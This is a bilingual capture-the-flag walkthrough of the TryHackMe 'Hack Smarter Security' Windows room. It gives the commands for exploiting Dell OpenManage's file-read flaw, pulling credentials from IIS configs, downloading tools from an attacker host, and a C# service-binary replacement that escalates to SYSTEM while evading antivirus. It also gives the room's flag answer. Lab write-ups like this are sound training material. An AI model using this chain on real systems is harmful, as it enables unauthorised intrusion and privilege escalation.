# Hack Smarter Security
| **Dificultad** | Medium |
| **Tipo** | Boot2Root (Windows) |
| **Slug** | `hacksmartersecurity` |
| **Link** | [TryHackMe](https://tryhackme.com/room/hacksmartersecurity) |
| **Sección** | 02 Level Medium |
| **Fuente** | Web (TryHackMe room `hacksmartersecurity` + walkthroughs públicos: 0xBEN, Disturbante, MrHDK) |
| **Componentes** | Microsoft FTP (acceso anónimo), OpenSSH for Windows 7.7, **Microsoft IIS 10.0**, **Dell EMC OpenManage Server Administrator** (CVE-2020-5377 / CVE-2021-21514: *auth bypass* + **arbitrary file read**), LFI/lectura de `applicationHost.config` y `web.config`, `PrivescCheck.ps1`, servicio con binario en ruta controlable ejecutado como `NT AUTHORITY\SYSTEM`, payload C#/.NET, RDP |
| **Impacto** | Compromiso completo de un servidor Windows: FTP anónimo, abuso de **lectura arbitraria de ficheros** en Dell OpenManage para extraer credenciales de los ficheros de configuración de IIS, acceso SSH como `tyler`, y **escalada a SYSTEM** sustituyendo el binario de un servicio con permisos de escritura y ejecutado como SYSTEM, para finalmente leer el flag en el escritorio de Administrator. |
---
**Contexto:** Hack Smarter Security es una room media de Windows que recrea la intrusión en la infraestructura del grupo APT "Hack Smarter". Se enumeran FTP anónimo, IIS y, sobre todo, **Dell EMC OpenManage** (puerto 1311) vulnerable a **CVE-2020-5377 / CVE-2021-21514** (evasión de autenticación + lectura de ficheros arbitraria). Con LFI se extraen los ficheros de configuración de IIS (`applicationHost.config`, `web.config`) y credenciales, se accede por SSH como `tyler` y se escala a **SYSTEM** por una mala configuración de servicio, evitando el AV con un binario .NET propio.
*EN: Hack Smarter Security is a medium Windows room recreating an intrusion into the "Hack Smarter" APT infrastructure. Anonymous FTP, IIS and, above all, **Dell EMC OpenManage** (port 1311) vulnerable to **CVE-2020-5377 / CVE-2021-21514** (authentication bypass + arbitrary file read) are enumerated. LFI is used to extract IIS configuration files (`applicationHost.config`, `web.config`) and credentials, SSH access as `tyler` is obtained, and privileges are escalated to **SYSTEM** via a service misconfiguration, bypassing AV with a custom .NET binary.*
## Solucionario
### Task 1: Hack Smarter Security
**Explicación:** La room pregunta por el flag y por las organizaciones que el grupo ataca después; la resolución es la siguiente.

#### Enumeración (nmap)
```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd   (Anonymous FTP login allowed)
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp   open  http          Microsoft IIS httpd 10.0   # HackSmarterSec
1311/tcp open  ssl/rxmon?    Dell EMC OpenManage (OpenManage™)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
- **FTP (21):** login anónimo permitido. Contiene `Credit-Cards-We-Pwned.txt` y `stolen-passport.png` (sin información útil).
- **HTTP (80):** IIS sirviendo una web estática (`HackSmarterSec`), sin hallazgos tras *bruteforce*.
- **1311:** **Dell EMC OpenManage Server Administrator** (HTTPS).
- **3389:** RDP.

#### Explotación de Dell OpenManage (CVE-2020-5377 / CVE-2021-21514)
Tras investigar el servicio, se localiza el PoC público de **Rhino Security Labs** (authentication bypass + arbitrary file read):
```bash
wget https://raw.githubusercontent.com/RhinoSecurityLabs/CVEs/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py
python3 CVE-2020-5377.py <IP_VPN> <IP_OBJETIVO>:1311
```
Con la **lectura arbitraria de ficheros** se confirma leyendo un fichero conocido de Windows (`C:/Windows/win.ini`), equivalente a `/etc/passwd` en Linux.

#### Enumeración mediante LFI (configuración de IIS)
Usando una wordlist de inclusión de ficheros en Windows se apuntan los ficheros de configuración de IIS:
```text
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/wwwroot/web.config
```
`applicationHost.config` revela los sitios y rutas físicas:
```xml
<site name="hacksmartersec" id="2" serverAutoStart="true">
    <application path="/" applicationPool="hacksmartersec">
        <virtualDirectory path="/" physicalPath="C:\inetpub\wwwroot\hacksmartersec" />
    </application>
    <bindings>
        <binding protocol="http" bindingInformation="*:80:" />
    </bindings>
</site>
<site name="data-leaks" id="1">
    <application path="/">
        <virtualDirectory path="/" physicalPath="C:\inetpub\ftproot" />
    </application>
</site>
```
Al leer la configuración de la web (`web.config` en `C:\inetpub\wwwroot\hacksmartersec`) se obtienen **credenciales**, y se accede por SSH:
```bash
ssh tyler@<IP>
```
La máquina tiene un **antivirus actualizado**, por lo que se restringe el uso de herramientas ofensivas habituales.

#### Escalada de privilegios (SYSTEM)
Se sube **PrivescCheck.ps1** (normalmente no dispara el AV) y se ejecuta:
```powershell
cd C:\Users\Tyler\Documents\
iwr http://<IP_ATACANTE>/PrivescCheck.ps1
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```
Se descubre un **servicio con el binario en una ruta sobre la que `tyler` tiene control total** y que se ejecuta como **`NT AUTHORITY\SYSTEM`**. Se sustituye el binario del servicio por un ejecutable **C#/.NET** propio (para evadir el AV) que añade a `tyler` al grupo de administradores:
```csharp
using System;
using System.Diagnostics;

class Program
{
    static void Main(string[] args)
    {
        string command = "net localgroup Administrators tyler /add";

        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-Command \"{command}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        Process process = Process.Start(psi);
        process.WaitForExit();
    }
}
```
```bash
mcs service.cs
python3 -m http.server 80
```
Se descarga el binario en la víctima y se reemplaza/elimina el binario original del servicio. Al reiniciarse el servicio, se ejecuta como SYSTEM y se añade `tyler` a Administradores. Tras reconectar por SSH, se accede al escritorio de Administrator para leer `user.txt` (y, como *post-explotación*, se crea un usuario RDP y se desactiva Defender).
*EN: Full chain: nmap enumeration (21/22/80/1311/3389); anonymous FTP; Dell OpenManage CVE-2020-5377/CVE-2021-21514 auth bypass + arbitrary file read; LFI of IIS applicationHost.config and web.config to leak credentials; SSH as tyler; PrivescCheck finds a service whose binary path is fully controllable and runs as SYSTEM; a custom C#/.NET executable is dropped to add tyler to Administrators (AV evasion), then the flag is read from the Administrator desktop.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is user.txt? | `THM{4ll15n0tw3llw1thd3ll}` |
| 2 | Which organizations is the Hack Smarter group targeting next? | `CyberLens, WorkSmarter, SteelMountain` |
---
**Metodología:** Enumeración (nmap/FTP anónimo) → identificación de Dell OpenManage (1311) → explotación CVE-2020-5377/CVE-2021-21514 (auth bypass + arbitrary file read) → LFI de `applicationHost.config` y `web.config` → credenciales → SSH como `tyler` → enumeración con `PrivescCheck.ps1` → servicio SYSTEM con binario controlable → payload C#/.NET (evasión de AV) → Administradores → `user.txt`.
**Learning chain:** enumerar servicios expuestos → abusar de una lectura de ficheros arbitraria → extraer credenciales de la configuración → acceder al host → enumerar servicios/permisos → secuestrar el binario de un servicio SYSTEM → leer el flag.
**Lección:** *Un servicio de gestión olvidado (Dell OpenManage) con lectura arbitraria de ficheros filtra credenciales de configuraciones de IIS, y un servicio SYSTEM con su binario en una ruta escribible entrega el control total del host; incluso con AV, un binario .NET legítimo puede eludir defensas.*
**MITRE ATT&CK:** T1046 (Network Service Discovery), T1078.003 (Local Accounts), T1190 (Exploit Public-Facing Application), T1005 (Data from Local System), T1552.001 (Credentials In Files), T1574.010 (Services File Permissions Weakness) / T1543.003 (Windows Service), T1059.001 (PowerShell), T1059.005 (Visual Basic) — relación, T1562.001 (Impair Defenses: Disable or Modify Tools), T1021.001 (Remote Desktop Protocol).
**Fuente:** [TryHackMe - Hack Smarter Security](https://tryhackme.com/room/hacksmartersecurity)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
